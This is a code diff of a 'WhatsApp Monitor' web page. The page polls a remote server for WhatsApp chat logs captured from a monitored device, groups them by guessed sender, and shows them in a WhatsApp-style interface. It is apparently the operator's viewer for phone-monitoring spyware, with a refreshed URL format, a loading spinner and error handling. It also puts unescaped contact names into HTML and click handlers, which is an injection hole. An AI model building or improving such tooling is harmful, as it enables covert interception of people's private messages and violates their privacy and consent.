@@ -6,7 +6,7 @@
     <title>WhatsApp Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- WHATSAPP DARK THEME CSS --- */
+        /* --- WHATSAPP DARK THEME --- */
         body { 
             margin: 0; background-color: #111b21; font-family: Helvetica, Arial, sans-serif; 
             color: #e9edef; height: 100vh; overflow: hidden; display: flex; justify-content: center;
@@ -26,7 +26,19 @@
         .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; flex: 1; }
         .top-icons { display: flex; gap: 20px; color: #aebac1; font-size: 1.1rem; }
 
-        .contact-list { flex: 1; overflow-y: auto; }
+        .contact-list { flex: 1; overflow-y: auto; position: relative; }
+        
+        /* Loading Animation */
+        .loader-container {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding-top: 50px; color: #00a884;
+        }
+        .spinner {
+            border: 4px solid #2a3942; border-top: 4px solid #00a884; border-radius: 50%;
+            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         .contact-item { display: flex; align-items: center; padding: 12px 15px; cursor: pointer; border-bottom: 1px solid #222; }
         .contact-item:active { background: #202c33; }
         .dp-circle { width: 45px; height: 45px; border-radius: 50%; background: #667781; display: flex; justify-content: center; align-items: center; margin-right: 15px; color: #fff; font-size: 1.2rem; }
@@ -67,7 +79,10 @@
                 </div>
             </div>
             <div class="contact-list" id="contactsContainer">
-                <p style="text-align:center; padding-top:20px; color:#888">Loading chats...</p>
+                <div class="loader-container">
+                    <div class="spinner"></div>
+                    <p id="statusText">Connecting...</p>
+                </div>
             </div>
         </div>
 
@@ -95,21 +110,32 @@
     </div>
 
     <script>
-        // --- LOGIC ---
         const DEVICE_ID = localStorage.getItem('monitoring_id');
-        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data"; 
+        // IMPORTANT: URL Format Fixed
+        const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 
 
         if (!DEVICE_ID) {
-            alert("Device ID Missing! Go back to Dashboard.");
+            alert("Device ID Missing!");
             window.location.href = 'index.html';
         }
 
         let groupedChats = {};
 
         async function fetchWhatsAppData() {
+            const statusText = document.getElementById('statusText');
+            
+            // Server wake up message logic
+            setTimeout(() => {
+                if(statusText) statusText.innerText = "Waking up server (Wait 30s)...";
+            }, 3000);
+
             try {
-                // Chat logs mangwao
-                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs&_=${new Date().getTime()}`);
+                // YAHAN CHANGE KIYA HAI: URL Format ab tumhare snippet jaisa hai
+                // Old: ?device_id=...
+                // New: /ID/chat_logs
+                const finalUrl = `${BASE_URL}/${DEVICE_ID}/chat_logs`;
+                
+                const response = await fetch(finalUrl);
                 const result = await response.json();
 
                 if (result.status === 'success' && result.data) {
@@ -119,56 +145,46 @@
                 }
             } catch (error) {
                 console.error("Fetch Error:", error);
+                document.getElementById('contactsContainer').innerHTML = 
+                    `<div style='text-align:center; color:#ff5f5f; margin-top:50px'>
+                        <i class="fa-solid fa-triangle-exclamation" style="font-size:2rem; margin-bottom:10px;"></i><br>
+                        Connection Error.<br>Server URL or Internet issue.<br>
+                        <button onclick="location.reload()" style="background:#00a884; color:white; border:none; padding:8px 15px; margin-top:10px; border-radius:5px;">Retry</button>
+                    </div>`;
             }
         }
 
         function processLogs(logs) {
             groupedChats = {};
-            
-            // 1. Sort by Time (Oldest -> Newest)
             logs.sort((a, b) => (a.time || 0) - (b.time || 0));
 
-            // Default sender agar naam detect na ho
             let currentSender = "Recent Messages"; 
 
             logs.forEach(log => {
+                // Ab hum 'type' filter nahi kar rahe kyunki URL se hi chat_logs aa rahe hain
+                // Bas App Name check kar rahe hain
                 if (log.app === 'WhatsApp') {
                     let text = (log.text || "").trim();
                     let time = log.time || Date.now();
 
-                    // --- FILTERING (Kachra Hatao) ---
-                    // "7:00 pm", "last seen", "online" jaise text message nahi hote
-                    if (text.includes("last seen") || 
-                        text.includes("online") || 
-                        text.includes("typing") || 
-                        /^\d{1,2}:\d{2}\s?(am|pm)$/i.test(text)) {
-                        return; // Skip karo
-                    }
+                    // Filter Garbage
+                    if (text.includes("last seen") || text.includes("online") || 
+                        text.includes("typing") || /^\d{1,2}:\d{2}\s?(am|pm)$/i.test(text)) return;
 
-                    // --- NAME DETECTION LOGIC ---
-                    // Agar text "Buddhu" jaisa chhota hai aur space nahi hai, to wo NAAM hai
+                    // Name Detection (No space, short, no link, no numbers)
                     if (text.length < 20 && !text.includes(" ") && !text.includes("http") && isNaN(text)) {
-                        currentSender = text; // Ab aage ke messages iske naam pe jayenge
-                        
-                        // Create Group immediately
+                        currentSender = text; 
                         if (!groupedChats[currentSender]) {
                             groupedChats[currentSender] = { name: currentSender, lastMsg: "Active", time: time, msgs: [] };
                         }
-                    } 
-                    else {
-                        // --- MESSAGE HANDLING ---
-                        // Agar naam detect nahi hua to "Recent Messages" mein daalo
+                    } else {
                         if (!groupedChats[currentSender]) {
                             groupedChats[currentSender] = { name: currentSender, lastMsg: "", time: time, msgs: [] };
                         }
-
-                        // Message add karo
                         groupedChats[currentSender].msgs.push({
                             text: text,
                             timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
                         });
-                        
-                        // Update preview
                         groupedChats[currentSender].lastMsg = text;
                         groupedChats[currentSender].time = time;
                     }
@@ -183,18 +199,16 @@
             const names = Object.keys(groupedChats);
 
             if (names.length === 0) {
-                container.innerHTML = "<p style='text-align:center; padding-top:20px; color:#888'>No readable chats yet.</p>";
+                container.innerHTML = "<p style='text-align:center; padding-top:20px; color:#888'>No WhatsApp chats found.</p>";
                 return;
             }
 
-            // Sort: Jiska message naya hai wo upar
             names.sort((a, b) => groupedChats[b].time - groupedChats[a].time);
 
             let html = "";
             names.forEach(name => {
                 const chat = groupedChats[name];
-                // Empty chats mat dikhao
-                if(chat.msgs.length === 0 && name !== "Buddhu") return; 
+                if(chat.msgs.length === 0 && name === "Recent Messages") return; 
 
                 html += `
                     <div class="contact-item" onclick="openChat('${name}')">
@@ -235,9 +249,8 @@
             document.getElementById('contactListView').style.display = 'flex';
         }
 
-        // Auto Refresh
         fetchWhatsAppData();
-        setInterval(fetchWhatsAppData, 5000);
+        setInterval(fetchWhatsAppData, 7000); 
 
     </script>
 </body>
